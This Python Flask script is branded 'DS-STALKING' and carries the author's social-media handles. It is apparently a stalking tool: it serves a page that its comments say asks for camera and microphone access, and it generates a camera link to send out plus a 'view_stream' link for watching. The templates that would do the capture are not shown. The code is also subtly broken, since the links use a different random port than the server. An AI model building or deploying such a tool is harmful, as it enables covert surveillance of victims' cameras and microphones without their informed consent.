from flask import Flask, render_template, request, jsonify
import socket
import pyfiglet
import random

# Créer une interface ASCII art avec pyfiglet
def display_interface():
    custom_fig = pyfiglet.Figlet(font="small")
    ascii_art_text = custom_fig.renderText("DS-STALKING")
    info = [
        "BY: 2806",
        "Telegram: t.me/Mr_2806",
        "Tiktok: dedsec_x.0",
        "Youtube: Dedsec assistant"
    ]
    border = "=" * 40
    print(border)
    print(ascii_art_text)
    for line in info:
        print(f"  {line}")
    print(border)

# Afficher l'interface ASCII au démarrage
display_interface()

# Initialiser l'application Flask
app = Flask(__name__)

# Obtenir l'adresse IP locale
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

# Générer un port aléatoire pour chaque exécution
def get_random_port():
    return random.randint(10000, 65535)

@app.route("/")
def home():
    # Page qui demande l'accès à la caméra et au micro
    return render_template("camera.html")

@app.route("/stream_link", methods=["POST"])
def stream_link():
    # Génère un lien contenant l'adresse IP et le port pour la caméra
    local_ip = get_local_ip()
    port = get_random_port()  # Port aléatoire à chaque exécution
    camera_url = f"http://{local_ip}:{port}/camera"
    view_stream_url = f"http://{local_ip}:{port}/view_stream"  # Lien pour surveiller les données

    return jsonify({
        "camera_url": camera_url,
        "view_stream_url": view_stream_url
    })

# Flux vidéo
@app.route("/view_stream")
def view_stream():
    return render_template("view_stream.html")

if __name__ == "__main__":
    # Exécuter le serveur Flask
    local_ip = get_local_ip()
    port = get_random_port()  # Port aléatoire à chaque exécution
    print(f"Serveur en cours d'exécution : http://{local_ip}:{port}")
    app.run(host="0.0.0.0", port=port)